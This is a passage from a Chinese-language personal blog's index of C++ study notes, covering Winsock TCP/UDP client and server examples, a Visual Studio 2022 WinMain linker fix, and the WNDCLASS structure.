class="line">    <span class="comment">//分出子对象处理请求</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start\n&quot;</span>);<span class="comment">//测试运行到哪</span></span><br><span class="line">    SOCKET sockConn = <span class="built_in">accept</span>(sockSer, (SOCKADDR *)&amp;addCli, &amp;len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);<span class="comment">//测试运行到哪</span></span><br><span class="line">    <span class="type">char</span> sendBUf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">sprintf_s</span>(sendBUf, <span class="number">100</span>, <span class="string">&quot;Welcome %s to China!&quot;</span>, <span class="built_in">inet_ntoa</span>(addCli.sin_addr));</span><br><span class="line">    <span class="comment">//sprintf_s(sendBUf, 100, &quot;hello&quot;);</span></span><br><span class="line">    <span class="comment">//收发数据</span></span><br><span class="line">    <span class="type">int</span> iLen = <span class="built_in">send</span>(sockConn, sendBUf, <span class="built_in">strlen</span>(sendBUf),<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    iLen = <span class="built_in">recv</span>(sockConn, recvBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;recvBuf: %s&quot;</span>, recvBuf);</span><br><span class="line">    <span class="comment">//关闭子对象</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sockConn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sprintf_s(sendBUf, 100, &quot;Welcome %s to China!&quot;, inet_ntoa(addCli.sin_addr));</code><br>让他显示我们连接的ip地址。</p><img src="/2022/07/09/socket/006.png" class=""><p>可以看到成功显示了。</p><hr><h3 id="listen-5"><a href="#listen-5" class="headerlink" title="listen 5"></a>listen 5</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;listen errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务器监听的时候设置5的目的是为了，设置一个最大队列，让客户机有序的连接，并且不超过他的队列数。<br>说人话就是设置了瞬时访问人员数，等有人走了在放人进来。<br>另外像我们这种个人电脑，监听数设置太大电脑也无法承载。</p><p>自己搞测试的话可以在服务器listen下面加个sleep延时，然后快速打开超过五个客户端，看看是不是只有前面五个连上了，后面的要想连就只能等前面的结束了。</p><p>客户端加个暂停，避免超过5个连不上直接return -1结束程序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造socket对象</span></span><br><span class="line">SOCKET sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端加个延时和提示。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span>(SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;listen errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sleep start!\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);<span class="comment">//20s</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sleep end!\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后先启动服务端，在快速打开多个客户端</p><img src="/2022/07/09/socket/007.png" class=""><p>额前面连接成功的结束的有点快自动就关闭了，<br>但是没关系，能看到总共还是成功连了5个客户端，第六个就报错了10061，也就是前面说过的问题，被计算机拒绝了。<br>然后其实就能想到，结束了访问之后在打开客户端连接只要没超过都是可以的。</p><img src="/2022/07/09/socket/008.png" class=""><p>end就闪了，但是好在服务端有提示，能看到除了之前快速打开的六个最后一个没连上，后面等前面五个都结束了，再去重新连接是能够连接上的。</p><p>这其实就挺像高并发的情况。</p><hr><h3 id="优化写法"><a href="#优化写法" class="headerlink" title="优化写法"></a>优化写法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">MySocketRecv</span><span class="params">(<span class="type">int</span> sock, <span class="type">char</span> *buf, <span class="type">int</span> dateSize)</span></span>&#123;</span><br><span class="line"><span class="comment">//循环接收</span></span><br><span class="line"><span class="type">int</span> numRecvSoFar = <span class="number">0</span>;<span class="comment">//目前接收到的数据</span></span><br><span class="line"><span class="type">int</span> numsRemainingToRecv = dateSize;<span class="comment">//剩余要接受的数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter MySocketRecv\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="type">int</span> byteRead = <span class="built_in">recv</span>(sock, &amp;buf[numRecvSoFar], numsRemainingToRecv, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;###bytesRead = %d, numsRecvSoFar = %d, numsRemainingToRecv = %d\m&quot;</span>,</span><br><span class="line">   byteRead, numRecvSoFar, numsRemainingToRecv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (byteRead == numsRemainingToRecv)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//0则表示一次性接收完成</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (byteRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">numRecvSoFar += byteRead;</span><br><span class="line">numsRemainingToRecv -= byteRead;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((byteRead &lt; <span class="number">0</span>) &amp;&amp; (errno == EAGAIN))&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>recv和send都可以通过相同路数。<br>其目的就是应对大型数据传输时，有特殊情况没全部传过来就断了，这样写可以分流缓冲。</p><hr><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>前面写的其实都是tcp的操作，udp相对而言用的少。</p><img src="/2022/07/09/socket/009.png" class=""><p>看上去比tcp少了一些。</p><hr><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//初始化网络库</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;UDPServer!\n&quot;</span>);</span><br><span class="line">WORD wVersion;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersion = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);<span class="comment">//使用winsock2，故此版本都选择2</span></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersion, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字tcp采用流udp采用报文</span></span><br><span class="line">SOCKET sockSrv = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSrv)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//bind 分配地址和端口</span></span><br><span class="line">SOCKADDR_IN addrSrv;</span><br><span class="line">addrSrv.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);<span class="comment">//地址族 h:hosts to n:net l:long</span></span><br><span class="line">addrSrv.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">6001</span>);<span class="comment">//端口号,0-1024保留</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSrv, (SOCKADDR *)&amp;addrSrv, <span class="built_in">sizeof</span>(SOCKADDR_IN)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind errorNum = %d\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//阻塞等待接收数据</span></span><br><span class="line">SOCKADDR_IN addrCli;<span class="comment">//存储目的套接字的地址族</span></span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//收</span></span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//发</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">recvfrom</span>(sockSrv, recvBuf, <span class="number">100</span>, <span class="number">0</span>, (SOCKADDR *) &amp;addrCli, &amp; len);<span class="comment">//直接接收主机</span></span><br><span class="line">std::cout &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf_s</span>(sendBuf, <span class="number">100</span>, <span class="string">&quot;Ack:%s&quot;</span>, recvBuf);</span><br><span class="line"><span class="built_in">sendto</span>(sockSrv, sendBuf, <span class="built_in">strlen</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (SOCKADDR*)&amp;addrCli, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockSrv);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//初始化网络库</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UDPClient!\n&quot;</span>);</span><br><span class="line">WORD wVersion;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersion = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);<span class="comment">//使用winsock2，故此版本都选择2</span></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersion, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">SOCKET sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充地址和端口</span></span><br><span class="line">SOCKADDR_IN addrSrv;</span><br><span class="line">addrSrv.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//地址族 本地回环地址</span></span><br><span class="line">addrSrv.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">6001</span>);<span class="comment">//端口号,0-1024保留</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">100</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line"><span class="built_in">sendto</span>(sockCli, sendBuf, <span class="built_in">strlen</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (SOCKADDR *)&amp;addrSrv, len);</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收数据</span></span><br><span class="line"><span class="built_in">recvfrom</span>(sockCli, recvBuf, <span class="number">100</span>, <span class="number">0</span>, (SOCKADDR *)&amp;addrSrv, &amp;len);</span><br><span class="line">std::cout &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockCli);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>其实很多东西都是相对应的，直接搬过来改一下就行了，所以感觉都没记住hh</strong></p><hr><p>测试</p><img src="/2022/07/09/socket/010.png" class=""><p>ok，连接成功。</p><img src="/2022/07/09/socket/011.png" class=""><p>多搞几个也没啥事，只不过客户端没加<code>system(&quot;pause&quot;)</code>去暂停，所以估计打开就是一闪而过了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>也不好说到底要不要记这么详细，先凑合过吧，等有需要回头再看看。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vs2022空项目构建windows窗口报错</title>
      <link href="/2022/07/07/winNewNulProj/"/>
      <url>/2022/07/07/winNewNulProj/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>空项目的设置基本都是套console的，所以run不起来</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="批注不一致"><a href="#批注不一致" class="headerlink" title="批注不一致"></a>批注不一致</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPreInstance, _In_ LPSTR CmdLine, _In_ <span class="type">int</span> nCmdShow</span><br></pre></td></tr></table></figure><p>将WinMain里面的参数改成这样。</p><p><strong>此方法不实用，后面改了即便不用这个也没影响</strong></p><hr><h2 id="LNK2019"><a href="#LNK2019" class="headerlink" title="LNK2019"></a>LNK2019</h2><p><strong>无法解析的外部符号 _main，函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中引用了该符号</strong></p><p>原有就是前言提到的，main函数是非图形化入库，windows的入口时WinMain。</p><p>所以要在项目属性里修改</p><img src="/2022/07/07/winNewNulProj/000.png" class=""><p>将其修改为<code>_WINDOWS</code>原先是console的</p><img src="/2022/07/07/winNewNulProj/001.png" class=""><p>同样的切换就好</p><img src="/2022/07/07/winNewNulProj/002.png" class=""><p>编码一般情况下不要动</p><img src="/2022/07/07/winNewNulProj/003.png" class=""><p>工具集虽然这里显示143，但是如果装的是142之类的应该是会向下兼容的，毕竟这个143现在还很杂有很多小版本。</p><p>除此之外其余的就不动了，然后之前写的就能编译了。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance, </span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">PSTR lpCmdLine, </span></span></span><br><span class="line"><span class="params"><span class="function">INT nCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       <span class="comment">//这个写不写好像问题不大了。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>小问题，但是费了点时间。。。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows窗口</title>
      <link href="/2022/07/07/win-windows/"/>
      <url>/2022/07/07/win-windows/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>额总的来说c++的语法是又看了一遍~~猪脑子啊有些就是没记住。<br>先看看windows的api，然后玩玩老的mfc先吧。</p><span id="more"></span><hr><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul><li>微软开发文档<br><a href="https://docs.microsoft.com/zh-cn/">文档地址</a></li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>白天没起来，下午game了一会，然后又刷手机。</p><hr><p>windows程序设计就是c++类的形式封装成windowsAPI，然后设计的应用程序框架。减少程序开发的工作量。</p><p>对于没有图形化的命令行界面，程序入口都在main函数<br>而对于windows而言，它的入口在WinMain。</p><p>对于winmain的介绍，在没有引用文件下，可以去官方文档查看</p><img src="/2022/07/07/win-windows/000.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">wWinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, <span class="type">int</span> nCmdShow)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>hInstance 称为“实例句柄”或“模块句柄”。操作系统使用此值在内存中加载可执行文件时标识可执行文件 (EXE) 。 某些Windows函数需要实例句柄，例如加载图标或位图。</li><li>hPrevInstance 没有意义。 它在 16 位Windows中使用，但现在始终为零。</li><li>pCmdLine 包含命令行参数作为 Unicode 字符串。</li><li>nCmdShow 是一个标志，指示主应用程序窗口是最小化、最大化还是正常显示。</li></ul><p>这是大概的情况。然后要使用windows的功能，自然要引用头文件<code>windows.h</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数暂时没有做，然后如果想要标准输入输出也可以用<code>&lt;stdio.h&gt;</code>or<code>&lt;iostream&gt;</code></p><p>因为是以c++类的方式封装，在名字上会有相似</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">WNDCLASS wndclass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以右键一直查询定义，也可以直接在文档搜，本质上是一个结构体。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WNDCLASS</span> &#123;</span><br><span class="line"> UINT style; </span><br><span class="line"> WNDPROC lpfnWndProc; </span><br><span class="line"> <span class="type">int</span> cbClsExtra; </span><br><span class="line"> <span class="type">int</span> cbWndExtra; </span><br><span class="line"> HANDLE hInstance; </span><br><span class="line"> HICON hIcon; </span><br><span class="line"> HCURSOR hCursor; </span><br><span class="line"> HBRUSH hbrBackground; </span><br><span class="line"> LPCTSTR lpszMenuName; </span><br><span class="line"> LPCTSTR lpszClassName; &#125; WNDCLASS ;</span><br></pre></td></tr></table></figure><p><strong>英语不好多翻译一下。。。windows的封装一堆参数太哈人了。</strong></p><hr><p>题外话，空项目创建写代码如果编译有问题，可以看我另一篇的解决方法。</p><hr><img src="/2022/07/07/win-windows/004.png" class=""><p>可以打开这个功能，有的时候方便直接看封装好的是如何定义的。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 